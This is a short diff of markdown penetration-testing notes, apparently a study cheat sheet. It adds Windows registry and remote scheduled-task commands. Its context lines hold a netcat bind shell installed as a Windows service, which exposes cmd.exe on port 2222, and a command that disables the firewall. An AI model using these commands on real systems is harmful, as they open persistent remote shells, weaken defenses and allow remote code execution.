@@ -118,7 +118,7 @@ ssh to connet
 ```
 ssh login_name@targetmachine -p 9000
 ```
-
+## Windows commands   
 #### service usage
 ```
 sc create ncservice2 binpath= "cmd.exe /k c:\tools\nc.exe -l -p 2222 -e cmd.exe"
@@ -141,7 +141,21 @@ Powershell
 ```
 Set-NetFirewallProfile -Enabled False
 ```   
-
+#### Reg Keys   
+```
+reg query
+reg add [Keyname] /v [ValueName] /t [type] /d [Data]
+reg export [KeyName] [filename.reg]
+reg import [filename.reg]
+```   
+#### Schtasks   
+```
+at [\\targetIP] [HH:MM][A|P] [command]
+```   
+or   
+```
+schtasks /create /tn [taskname] /s [targetIP] /u [user] /p [password] /sc [frequency] /st [starttime] /sd [startdate] /tr [command]
+```   
 
 # Chapter 4
 
